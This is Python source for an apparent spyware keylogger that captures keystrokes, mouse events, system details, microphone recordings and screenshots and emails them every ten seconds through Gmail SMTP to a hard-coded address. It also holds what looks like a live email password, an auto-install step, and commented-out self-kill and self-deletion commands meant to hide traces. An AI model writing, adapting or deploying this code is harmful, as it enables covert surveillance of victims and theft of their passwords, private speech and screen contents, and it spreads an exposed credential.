import cv2
import numpy as np
import pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import sounddevice as sd
    from pynput import keyboard  # Import keyboard first
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "titprocute1124@gmail.com"
    EMAIL_PASSWORD = "lfmn rvmd qyan pcha"
    SEND_REPORT_EVERY = 10 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)
        
        def send_mail_withAttach(self, email, password, message, attachment_path=None):
            sender = "titprocute1124@gmail.com"
            receiver = "titprocute1124@gmail.com"

            # Create the MIME object
            msg = MIMEMultipart()
            msg["Subject"] = "Main Mailtrap"
            msg["To"] = receiver
            msg["From"] = sender

            # Add the text message to the email
            body = "Keylogger by bao\n"
            if type(message) == str:
                body += message
            msg.attach(MIMEText(body, "plain"))

            # Add the attachment if provided
            if attachment_path:
                attachment = open(attachment_path, "rb")
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition", f"attachment; filename= {attachment_path}"
                )
                msg.attach(part)

            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.ehlo()
                server.starttls()
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())
                server.close()

        def send_mail(self, email, password, message):
            sender = "titprocute1124@gmail.com"
            receiver = "titprocute1124@gmail.com"

            vocal = None

            m = f"""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}

            Keylogger by bao\n"""

            if(type(message)==str):
                m+=message
            else:
                vocal=message                

            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.ehlo()
                server.starttls()
                server.login(email, password)
                server.sendmail(sender, receiver,message )
                server.close()

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
            self.send_mail_withAttach(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="This is a wave test", attachment_path="./sound.wav")

        def screenshot(self):            
            # take screenshot using pyautogui 
            image = pyautogui.screenshot() 
            
            # since the pyautogui takes as a  
            # PIL(pillow) and in RGB we need to  
            # convert it to numpy array and BGR  
            # so we can write it to the disk 
            image = cv2.cvtColor(np.array(image), 
                                cv2.COLOR_RGB2BGR) 
            
            # writing it to the disk using opencv 
            cv2.imwrite("image1.png", image) 
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=image)

        def run(self):
            # self.screenshot()
            self.microphone()
            # keyboard_listener = pynput.keyboard.Listener(on_press=self.save_data)
            # with keyboard_listener:
            #     self.report()
            #     keyboard_listener.join()
            # with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            #     mouse_listener.join()

            # if os.name == "nt":
            #     try:
            #         pwd = os.path.abspath(os.getcwd())
            #         os.system("cd " + pwd)
            #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
            #         print('File was closed.')
            #         os.system("DEL " + os.path.basename(__file__))
            #     except OSError:
            #         print('File is close.')

            # else:
            #     try:
            #         pwd = os.path.abspath(os.getcwd())
            #         os.system("cd " + pwd)
            #         os.system('pkill leafpad')
            #         os.system("chattr -i " +  os.path.basename(__file__))
            #         print('File was closed.')
            #         os.system("rm -rf" + os.path.basename(__file__))
            #     except OSError:
            #         print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()



